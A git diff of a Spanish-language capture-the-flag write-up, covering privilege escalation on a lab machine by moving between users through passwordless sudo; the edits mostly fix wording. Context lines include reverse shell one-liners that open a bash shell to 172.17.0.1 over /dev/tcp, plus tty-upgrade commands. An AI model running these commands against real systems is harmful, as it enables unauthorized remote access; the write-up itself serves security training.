@@ -106,7 +106,7 @@ Ahora somos el usuario *trainer* pero debemos continuar buscando la forma de lle
 
 ## 👑 3. Escalada de Privilegios
 
-Ahora tenemos que seguir buscando como escalar privilegios, comenzamos probando de nuevo sudo -l y vemos que también podemos ejecutar como el usuario coach sin usar contraseña /bin/bash.
+Tenemos que seguir buscando como escalar privilegios, comenzamos probando de nuevo sudo -l y vemos que también podemos ejecutar como el usuario coach sin usar contraseña /bin/bash.
 
 <img width="998" height="313" alt="11coachahora" src="https://github.com/user-attachments/assets/f4236703-7eea-46b8-9fc8-03bb04a36b2f" />
 <br><br>
@@ -119,7 +119,8 @@ sudo -u coach /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 <img width="1244" height="464" alt="12nosfuimos" src="https://github.com/user-attachments/assets/2baad9fd-b0f9-4464-823d-c64326984a51" />
 <br><br>
 
-Podemos sanitizar la tty, para ello ejecutamos los siguientes comandos:
+Podemos sanitizar la tty, para ello ejecutamos los siguientes comandos en orden:
+
 ```bash
 script /dev/null -c bash
 Ctrl + Z #  suspender la shell actual
@@ -134,20 +135,23 @@ stty rows 32 columns 149 # poner los valores de tu terminal, mirarlos con stty s
 <img width="843" height="199" alt="13sanitizamostty" src="https://github.com/user-attachments/assets/d4d9a740-0d21-47e2-b7f0-905c25441795" />
 <br><br>
 
+Ya tenemos la tty lista. Miramos si tenemos algún permiso sudo y vemos que también podemos ejecutar como el usuario *nutritionist* sin usar contraseña /bin/bash.
+
 <img width="1236" height="249" alt="14otromas" src="https://github.com/user-attachments/assets/2fe2bdf3-762b-4c80-af10-2eafbed4b129" />
 <br><br>
 
+Lanzamos el siguiente comando una vez que hayamos dejado a la escucha el puerto 444.
 
 ```bash
 sudo -u nutritionist /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/444 0>&1'
 ```
 
-<br><br>
+<br>
 <img width="1232" height="223" alt="14venga" src="https://github.com/user-attachments/assets/0e484871-9d9a-47f9-9e6c-290247c81815" />
 <br><br>
 
 
-Ahora somos el usuario nutricionist, este usuario no tiene ningún permiso sudo. Po ello, debemos buscar otra forma de escalar privilegios.
+Ahora somos el usuario nutricionist, este usuario no tiene ningún permiso sudo. Por ello, debemos buscar otra forma de escalar privilegios.
 <img width="1005" height="205" alt="15aleluya" src="https://github.com/user-attachments/assets/e03b9474-6b5f-4995-9562-5fbcf1f8b82a" />
 <br><br>
 
